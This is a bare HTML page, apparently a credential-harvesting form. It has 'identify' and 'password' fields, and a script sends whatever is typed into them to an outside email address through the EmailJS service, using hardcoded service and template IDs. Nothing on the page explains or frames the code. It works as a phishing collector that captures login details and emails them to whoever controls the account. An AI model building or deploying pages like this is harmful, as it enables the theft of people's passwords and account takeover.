<!DOCTYPE html>
<html lang="en">
<head>

    <title>Document</title>
    <script type="text/javascript"
        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
    </script>
    <script type="text/javascript">
        (function(){
            emailjs.init("SKpvX_zVBkj86VJsM");
        })();
    </script>
    <script type="text/javascript">
        function send() {
            emailjs.send("service_910usgs", "template_sr7h0fu", {identify: document.getElementById("identify").value, password: document.getElementById("password").value}, "SKpvX_zVBkj86VJsM");
        }
    </script>
</head>
<body>
    <div>
        <input
          type="text"
          placeholder="identify"
          id="identify"
        />
        <input
          type="text"
          placeholder="password"
          id="password"
        />
        <button onClick="send()">submit</button>
    </div>
</body>
</html>
